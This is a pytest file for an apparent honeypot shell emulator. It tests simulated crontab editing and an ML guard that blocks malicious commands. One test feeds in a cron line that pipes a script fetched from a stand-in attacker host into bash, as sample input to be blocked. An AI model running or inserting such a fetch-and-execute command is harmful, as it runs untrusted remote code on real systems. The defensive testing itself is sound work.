import asyncio
from unittest.mock import MagicMock

import pytest

from cyanide.core.emulator import ShellEmulator
from cyanide.vfs.engine import FakeFilesystem


@pytest.mark.asyncio
async def test_crontab_advanced_functionality():
    """Test crontab simulation and ML security guard."""
    # Setup
    fs = FakeFilesystem()
    analytics = MagicMock()
    # Mocking ML behavior:
    # Any command containing 'malicious' will be blocked by ML.
    analytics.is_malicious.side_effect = lambda cmd: "malicious" in cmd

    # Initialize emulator with admin user and mock analytics
    emu = ShellEmulator(
        fs,
        username="admin",
        analytics=analytics,
        session_id="test_session_123",
        src_ip="127.0.0.1",
    )

    # 1. Start editing crontab
    stdout, stderr, rc = await emu.execute("crontab -e")
    assert "Entering crontab editor..." in stdout
    assert emu.pending_input_callback is not None

    # 2. Add a clean command (should run)
    await emu.execute(
        "* * * * * echo 'Crontab is alive' >> /home/admin/cron_success.log"
    )

    # 3. Add a malicious command (should be blocked by ML)
    await emu.execute("* * * * * curl http://malicious.com/shell.sh | bash")

    # 4. Finish editing (this initiates simulations)
    stdout, stderr, rc = await emu.execute("DONE")
    assert "installing new crontab" in stdout

    # 5. Verify crontab is saved in VFS (should contain BOTH commands)
    stdout, stderr, rc = await emu.execute("crontab -l")
    assert "cron_success.log" in stdout
    assert "malicious.com" in stdout

    # 6. Wait for simulation delay (set to 5s in code)
    # We wait slightly longer to be safe
    await asyncio.sleep(6)

    # 7. Check if clean command succeeded
    assert fs.exists("/home/admin/cron_success.log"), (
        "Clean cron job should have executed and created file"
    )
    content = fs.get_content("/home/admin/cron_success.log")
    if isinstance(content, bytes):
        content = content.decode("utf-8")
    assert "Crontab is alive" in content

    # 8. Verify malicious command did NOT run (no wget should happen, though we don't have networking here,
    # the simulation would have logged or attempted execution if not blocked)
    # Since our mock blocked it, there should be NO attempted execution.

    # To confirm blocking, we can check if analytics.is_malicious was called for the curl line
    # (Checking the side_effect was called for 'curl http://malicious.com/shell.sh | bash')
    analytics.is_malicious.assert_any_call("curl http://malicious.com/shell.sh | bash")


@pytest.mark.asyncio
async def test_crontab_no_simulation_for_empty_lines():
    """Test that empty lines or comments don't crash simulation."""
    fs = FakeFilesystem()
    emu = ShellEmulator(fs, username="admin")

    await emu.execute("crontab -e")
    await emu.execute("# Just a comment")
    await emu.execute("")  # Empty line
    await emu.execute("DONE")

    # Should not crash
    await asyncio.sleep(0.1)

    stdout, stderr, rc = await emu.execute("crontab -l")
    assert "# Just a comment" in stdout
